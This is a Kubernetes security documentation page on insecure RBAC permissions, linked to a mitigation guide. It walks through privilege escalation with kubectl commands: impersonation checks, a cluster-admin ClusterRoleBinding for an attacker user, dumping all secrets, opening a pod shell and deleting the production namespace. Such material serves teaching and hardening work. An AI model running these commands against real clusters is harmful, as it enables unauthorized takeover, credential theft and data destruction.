---
sidebar_position: 8
title: "Insecure RBAC Permissions"
description: "How overly permissive Kubernetes RBAC configurations enable privilege escalation and full cluster compromise."
keywords: [kubernetes security, RBAC, role-based access control, RBAC misconfiguration, privilege escalation, kubernetes permissions, overprivileged roles, RBAC security, cluster-admin, CKS]
tags: [attack-vector, rbac, authorization, privilege-escalation, CKS]
related:
  - /docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/insecure_rbac_permissions_mitigation/
  - /docs/fundamentals/authorization/rbac/
  - /docs/attack_vectors/privileged_service_accounts/
  - /docs/attack_vectors/service_account_token_abuse/
---

# Insecure RBAC Permissions

Kubernetes uses **Role-Based Access Control (RBAC)** to define who can perform what actions on which resources. When RBAC policies are **misconfigured**—especially with wildcard permissions or broad cluster role bindings—attackers can **escalate privileges**, impersonate users, and gain full control over the cluster.

---

## Exploitation Steps

### 1. List RBAC Roles and Bindings

The attacker uses a compromised pod or user account to list all RBAC roles, bindings, and cluster-wide permissions:

```bash
kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A
```

They inspect the output for excessive permissions, wildcard access, or sensitive bindings.

---

### 2. Check Impersonation Rights

The attacker checks whether they are allowed to impersonate a high-privileged user like `admin`:

```bash
kubectl auth can-i '*' '*' --as=admin
```

If the result is `yes`, the attacker can assume admin-level access.

---

### 3. Create a ClusterRoleBinding

If allowed to bind roles, the attacker binds themselves to the powerful `cluster-admin` role:

```bash
kubectl create clusterrolebinding attacker-admin \
  --clusterrole=cluster-admin \
  --user=attacker
```

Or by applying a crafted binding file:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwned-cluster-admin
subjects:
  - kind: User
    name: admin
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

Apply it:

```bash
kubectl apply -f pwned-cluster-admin.yaml
```

---

### 4. Execute Arbitrary Commands

Now acting as a `cluster-admin`, the attacker has unrestricted access:

```bash
kubectl get secrets -A
kubectl exec -it <pod-name> -- /bin/sh
kubectl delete namespace production
```

They can read secrets, modify workloads, and delete critical resources across all namespaces.

---

### Result

The attacker has **full administrative control** over the cluster. They can exfiltrate data, delete services, pivot to other environments, or install persistent backdoors.

---

## Mitigation

➡ [See Mitigation Guide for Insecure RBAC Permissions](/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/insecure_rbac_permissions_mitigation)

---

## References

This article is based on information from the following official sources:

1. [Using RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/) - Kubernetes Documentation
2. [Authorization Overview](https://kubernetes.io/docs/reference/access-authn-authz/authorization/) - Kubernetes Documentation
3. [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes) - Center for Internet Security
